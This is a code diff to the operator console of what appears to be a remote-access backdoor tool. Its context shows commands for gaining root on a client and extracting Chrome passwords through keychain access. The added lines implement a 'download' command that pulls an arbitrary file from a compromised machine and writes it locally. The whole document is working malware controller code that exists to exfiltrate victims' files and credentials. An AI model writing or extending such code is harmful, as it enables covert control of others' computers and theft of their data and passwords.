@@ -274,6 +274,27 @@ if __name__ == '__main__':
                         elif command == "get_root":
                             print MESSAGE_INFO + "Attempting to get root, this may take a while..."
                             print server.current_client.send_command("get_root")
+                        elif command.startswith("download"):
+                            try:
+                                file_path = command.split(" ")[1]
+                                response = server.current_client.send_command("download {0}".format(file_path))
+
+                                if "Failed" in response:
+                                    print response
+                                else:
+                                    current_directory = os.path.dirname(os.path.realpath(__file__))
+                                    output_directory = current_directory + "/Downloads/"
+                                    output_file = output_directory + os.path.basename(file_path)
+
+                                    if not os.path.isdir(output_directory):
+                                        os.mkdir(output_directory)
+
+                                    with open(output_file, "wb") as open_file:
+                                        open_file.write(base64.b64decode(response))
+
+                                    print MESSAGE_INFO + "File written to {0}.".format(output_file)
+                            except IndexError:
+                                print MESSAGE_ATTENTION + "Please specify the remote file."
                         elif command == "chrome_passwords":
                             print MESSAGE_ATTENTION + "This will prompt the user to allow keychain access."
                             confirm = raw_input(MESSAGE_INPUT + "Are you sure you want to continue? [Y/n] ")
